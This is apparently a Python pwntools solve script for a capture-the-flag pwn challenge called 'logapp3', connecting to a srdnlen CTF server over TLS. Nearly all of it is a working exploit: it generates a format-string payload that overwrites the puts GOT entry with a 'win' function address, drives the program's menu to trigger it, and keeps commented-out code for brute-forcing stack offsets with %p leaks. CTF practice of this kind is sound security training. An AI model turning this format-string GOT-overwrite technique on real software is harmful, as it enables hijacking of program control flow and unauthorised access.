#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
context.log_level = 'error' # se non vuoi vedere i loggin
exe = context.binary = ELF(args.EXE or './logapp3')

host = args.HOST or 'logapp3.chall.srdnlen.it'
port = int(args.PORT or 443)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port, ssl=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *0x401609
b *0x4015bc
b *0x40144e
b *0x40143f
continue
'''.format(**locals())

# -- Exploit goes here --
# 0x401dde win
# io = start()

# i = 5

# print(int("0x40",16)) # 64 
# print(int("0x1d",16)) # 29
# print(int("0xde",16)) # 222
# print(hex(222))
payloadW = fmtstr_payload(47, {int(hex(exe.got["puts"]), 16) : 0x401dde})
print(payloadW)

io = start()
# payload = f"AAAA.%{i}$p".encode()
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b": ", payloadW)
io.sendlineafter(b": ", b"vaffanculo")
print(io.recvline())
print(io.recvline())
print(io.recvline())
print(io.recvline())
print(io.recvline())
print(io.recvline())
print(io.recvline())    
io.sendline(b"2")
print(io.recvline())
io.sendlineafter(b": ", b"SuperStrongPassword")
resp0 = io.recvline()
resp = io.recvline()
print(resp0, resp)
First = False
io.close()


# i = 0 
# First = True
# while False:
#     i += 1
#     try:
#         io = start()
#         payload = f"AAAA.%{i}$p".encode()
#         io.sendlineafter(b"> ", b"1")
#         io.sendlineafter(b": ", payloadW)
#         io.sendlineafter(b": ", b"vaffanculo")
#         print(io.recvline())
#         io.sendlineafter(b"> ", b"2")
#         io.sendlineafter(b": ", b"SuperStrongPassword")
#         resp0 = io.recvline()
#         resp = io.recvline()
#         print(resp0, resp)
#         First = False
#         io.close()

#     except EOFError:
#         First = False
#         pass



# io.interactive()

